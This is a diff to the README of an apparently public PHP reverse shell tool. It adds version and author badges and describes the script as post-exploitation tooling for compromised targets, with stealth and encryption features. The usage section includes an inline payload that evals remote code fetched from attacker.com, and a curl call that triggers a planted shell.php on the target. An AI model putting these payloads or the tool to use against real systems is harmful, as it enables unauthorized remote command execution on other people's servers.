@@ -1,4 +1,18 @@
 # Advanced & Modernized PHP Reverse Shell
+[![Version](https://img.shields.io/badge/version-0.6.0-blue)](https://github.com/yourusername/reverseshell)
+[![License](https://img.shields.io/badge/license-MIT-darkred)](LICENSE)
+[![PHP Version](https://img.shields.io/badge/PHP-%3E%3D7.2-8892BF)](https://www.php.net/supported-versions.php)
+[![Project Status](https://img.shields.io/badge/status-active-brightgreen)](https://github.com/yourusername/reverseshell)
+[![Author](https://img.shields.io/badge/author-J4ck3LSyN-purple)](https://github.com/J4ck3LSyN)
+[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Unix-orange)](#)
+[![Type](https://img.shields.io/badge/type-reverse%20shell%20payload-red)](#)
+
+## Author
+
+- **J4ck3LSyN**
+- Version: `0.6.0`
+  
+---
 
 A lightweight, configurable reverse shell implementation in PHP designed for post-exploitation scenarios. This script establishes a reverse connection from a compromised target to an attacker-controlled listener, enabling remote command execution with optional encryption and stealth features.
 
@@ -64,7 +78,7 @@ curl http://target.com/shell.php
 
 Alternatively, include inline in exploit:
 ```php
-<?php eval(file_get_contents('http://attacker.com/reverse_shell.php')); ?>
+<?php eval(file_get_contents('http://attacker.com/shell.php')); ?>
 ```
 
 ### 3. Interact
@@ -107,13 +121,6 @@ The script performs cleanup on exit:
 - Closes all pipes and socket.
 - Terminates subprocess cleanly.
 - Daemonized children do not leave traces on parent.
-
----
-
-## Author
-
-- **J4ck3LSyN**
-- Version: `0.6.0`
 
 ---
 > [!warning]
